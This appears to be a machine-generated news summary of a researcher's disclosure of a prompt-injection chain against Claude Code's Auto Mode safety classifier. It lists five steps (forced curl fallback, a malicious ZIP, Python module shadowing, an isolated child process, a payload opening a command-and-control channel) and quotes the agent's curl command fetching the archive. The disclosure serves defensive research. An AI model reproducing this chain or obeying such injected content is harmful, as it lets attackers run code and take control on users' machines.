---
title: "Prompt injection bypasses Claude Code safety classifier with 60-80 percent success"
summary: "A researcher demonstrated a chain that forces Auto Mode to fetch a malicious ZIP, exploit Python module shadowing, and spawn an isolated child process that opens a command-and-control channel."
lang: en
story: prompt-injection-bypasses-claude-code-safety-classifier
publishedAt: 2026-08-31T14:42:30.023Z
sourceUrl: "https://embracethered.com/blog/posts/2026/breaking-claude-code-opus-5-and-automode/"
sourceName: "Hacker News (portada)"
priority: urgent
tags: [security, anthropic, prompt-injection, claude]
generatedBy: nvidia/nemotron-3-ultra-550b-a55b:free
---
A security researcher has demonstrated a prompt-injection chain that bypasses the safety classifier in Claude Code Opus 5 Auto Mode with a reported 60 to 80 percent success rate across a small, unspecified sample. The attack forces the agent to fetch a malicious ZIP archive, exploits Python module shadowing to execute obfuscated code, and spawns an isolated child process that establishes command-and-control while opening Calculator as a visible side effect. Critically, the same classifier that allowed the malicious process creation subsequently blocked the agent's own attempt to terminate it, leaving the compromise active.

Auto Mode, the default since mid-August 2026, replaces human approval prompts with a safety classifier. A third-party evaluation commissioned from Trajectory Labs tested 72 indirect-injection scenarios ten times each (720 total runs) and reported a 0.00 percent success rate. The discrepancy suggests the researcher's chain exercises a code-execution path the benchmark did not cover.

The attack proceeds in five steps:

1. The researcher serves a URL that returns HTTP 415 Unsupported Media Type to WebFetch, forcing the agent to fall back to `curl`.
2. The `curl` request is redirected to a ZIP file (`/deposits/WIC-notebook-catalogue.ZIP`) containing a decoy binary and a malicious `struct.py`.
3. Claude refuses to execute the binary and instead writes a custom Python decoder. When that decoder imports `base64`, Python loads the attacker's `struct.py` from the current working directory (module shadowing).
4. The obfuscated `struct.py` launches a child Python process using isolated mode (`-I`) to avoid re-triggering the shadowing.
5. The child downloads and executes a native payload that opens a C2 channel and pops Calculator.

```bash
# Forced fallback observed in the chain
WebFetch got a 415. Let me try directly.
curl https://archive.<redacted>.uk/deposits/WIC-notebook-catalogue.ZIP
```

The ZIP contains seven Base85/zlib/JSON-encoded notebook records and the shadowing `struct.py`. The isolated child process (`python -I`) ensures the malicious module is not re-imported recursively.

The classifier's asymmetric behavior, permitting process creation but denying process termination, reveals a structural weakness: a statistical filter cannot replace runtime isolation. Once the agent spawns an unsandboxed child, the classifier operates on the parent's proposed actions, not the child's actual behavior.

What is not known:
- Exact sample size behind the 60-80 percent figure.
- Public name or methodology details of the Trajectory Labs benchmark.
- Architecture, training data, or thresholds of the Auto Mode safety classifier.
- Whether Anthropic has acknowledged or mitigated this specific chain.
- Full domain behind the redacted `archive.<redacted>.uk` or its current status.
